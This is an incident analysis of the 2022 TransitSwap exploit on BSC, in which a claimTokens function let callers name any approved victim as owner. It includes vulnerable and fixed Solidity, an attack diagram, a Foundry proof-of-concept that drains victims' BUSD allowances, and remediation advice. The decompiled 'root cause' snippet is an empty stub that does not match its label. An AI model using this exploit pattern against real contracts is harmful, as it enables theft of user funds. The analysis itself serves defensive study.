# TransitSwap — transferFrom `owner` Parameter Validation Bypass Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | TransitSwap |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~$21M |
| **Vulnerable Contract** | [0x8785bb8deAE13783b24D7aFE250d42eA7D7e9d72](https://bscscan.com/address/0x8785bb8deAE13783b24D7aFE250d42eA7D7e9d72) (TransitSwap) |
| **Bridge** | [0x0B47275E0Fe7D5054373778960c99FD24F59ff52](https://bscscan.com/address/0x0B47275E0Fe7D5054373778960c99FD24F59ff52) |
| **ClaimTokens** | [0xeD1afC8C4604958C2F38a3408FA63B32E737c428](https://bscscan.com/address/0xeD1afC8C4604958C2F38a3408FA63B32E737c428) |
| **Attack Contract** | [0x8CA8fD9C7641849A14CbF72FaF05c305B0c68a34](https://bscscan.com/address/0x8CA8fD9C7641849A14CbF72FaF05c305B0c68a34) |
| **Attacker** | [0x5f0b31AA37Bce387a8b21554a8360C6B8698FbEF](https://bscscan.com/address/0x5f0b31AA37Bce387a8b21554a8360C6B8698FbEF) |
| **Victim Example** | [0x1aAe0303f795b6FCb185ea9526Aa0549963319Fc](https://bscscan.com/address/0x1aAe0303f795b6FCb185ea9526Aa0549963319Fc) |
| **Root Cause** | Missing `owner` parameter validation in `transferFrom` of the ClaimTokens contract, allowing an arbitrary victim to be specified |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/TransitSwap_exp.sol) |

---
## 1. Vulnerability Overview

TransitSwap's ClaimTokens contract contained logic that internally executed `transferFrom(owner, recipient, amount)` during the token claim process. The problem was that the `owner` parameter was not enforced to be the caller (`msg.sender`) — it could be specified arbitrarily by an external caller. TransitSwap is a popular DEX aggregator, and a large number of users had granted token approvals to the contract. The attacker collected this list of victims, then drained ~$21M in BUSD/USDT by designating each victim as `owner` and executing `transferFrom()` against their balances.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable ClaimTokens — owner parameter not validated
contract ClaimTokens {
    // Function to claim remaining tokens after a swap
    function claimTokens(
        address token,
        address owner,    // ❌ Arbitrary address accepted (not enforced to msg.sender)
        uint256 amount,
        address recipient
    ) external {
        // ❌ No check that owner == msg.sender
        // Attacker can specify any victim who has approved TransitSwap as owner
        IERC20(token).transferFrom(owner, recipient, amount);
    }
}

// ✅ Correct pattern — enforce msg.sender as owner
contract SafeClaimTokens {
    function claimTokens(
        address token,
        uint256 amount,
        address recipient
    ) external {
        // ✅ owner is always the caller themselves
        IERC20(token).transferFrom(msg.sender, recipient, amount);
    }
}

// ✅ Or signature-based verification
contract SafeClaimTokensWithSig {
    function claimTokensWithSig(
        address token,
        address owner,
        uint256 amount,
        address recipient,
        bytes calldata signature
    ) external {
        // ✅ Confirm intent via owner's signature
        bytes32 hash = keccak256(abi.encodePacked(token, owner, amount, recipient));
        address signer = ECDSA.recover(hash, signature);
        require(signer == owner, "Invalid signature");
        IERC20(token).transferFrom(owner, recipient, amount);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**TransitSwap_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: Missing owner parameter validation in transferFrom of ClaimTokens contract, allowing arbitrary victim specification
    function _CONTRACT_WHITE_LIST_(address arg0) external {}  // 0x904fbbaf
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Reconnaissance: collect list of victim addresses
    │       that have approved BUSD/USDT to the TransitSwap contract
    │       (by analyzing on-chain Approval events)
    │
    ├─[2] For each victim, iterate:
    │       victim = victim address (account that approved TransitSwap)
    │       victimAllowance = BUSD.allowance(victim, ClaimTokens)
    │       victimBalance   = BUSD.balanceOf(victim)
    │       amount = min(allowance, balance)
    │
    ├─[3] Call ClaimTokens.claimTokens(
    │         token     = BUSD,
    │         owner     = victim,   // ← arbitrary victim specified
    │         amount    = amount,
    │         recipient = attacker
    │       )
    │       ❌ No owner == msg.sender check
    │       → BUSD.transferFrom(victim, attacker, amount) executes
    │
    ├─[4] Repeat across multiple victims → accumulate BUSD/USDT
    │
    └─[5] Net profit: ~$21M
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IClaimTokens {
    // ❌ No owner parameter validation
    function claimTokens(
        address token,
        address owner,
        uint256 amount,
        address recipient
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract TransitSwapExploit is Test {
    IClaimTokens claimTokens = IClaimTokens(0xeD1afC8C4604958C2F38a3408FA63B32E737c428);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    address[] victims; // Pre-collected list of victim addresses

    function setUp() public {
        vm.createSelectFork("bsc", 22_371_035);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker BUSD", BUSD.balanceOf(address(this)), 18);

        // Execute attack against each victim
        for (uint256 i = 0; i < victims.length; i++) {
            address victim = victims[i];
            uint256 allowance = BUSD.allowance(victim, address(claimTokens));
            uint256 balance = BUSD.balanceOf(victim);
            uint256 amount = allowance < balance ? allowance : balance;

            if (amount == 0) continue;

            // ⚡ owner = victim, recipient = attacker
            // ClaimTokens transfers victim's BUSD to the attacker
            claimTokens.claimTokens(
                address(BUSD),
                victim,           // ← arbitrary victim specified (no validation)
                amount,
                address(this)     // ← attacker receives funds
            );
        }

        emit log_named_decimal_uint("[End] Attacker BUSD", BUSD.balanceOf(address(this)), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | transferFrom `owner` parameter validation bypass |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Arbitrary Call Vulnerability (victim allowance theft) |
| **Attack Vector** | Repeated calls to `claimTokens(BUSD, victim, amount, attacker)` |
| **Preconditions** | Victim has approved the ClaimTokens contract for tokens; `owner` parameter not validated |
| **Impact** | ~$21M in BUSD/USDT drained from victim accounts |

---
## 6. Remediation Recommendations

1. **Enforce `owner`**: In any `transferFrom(owner, ...)` pattern, `owner` must be fixed to `msg.sender` or validated via a cryptographic signature.
2. **Eliminate allowance-based arbitrary access**: When a contract executes `transferFrom` on behalf of a user, it must be designed so that only the caller can access their own tokens.
3. **Educate users on approval minimization**: Guide users to approve only the exact amount needed rather than unlimited approvals, to limit the blast radius of any future exploit.

---
## 7. Lessons Learned

- **The `owner` parameter trap**: In the `transferFrom(owner, to, amount)` pattern, if `owner` is an externally supplied input, an attacker can spend the tokens of any arbitrary victim. This is one of the most common vulnerabilities in DEX routers and aggregator contracts.
- **The danger of lingering approvals**: When a user grants an approval to a contract, all approved assets are at risk the moment that contract becomes vulnerable. Making a habit of revoking approvals after use is critical.
- **The $21M lesson**: The omission of a single line — `require(owner == msg.sender)` — led to one of the largest exploits ever recorded. Input validation is the most fundamental principle of DeFi security.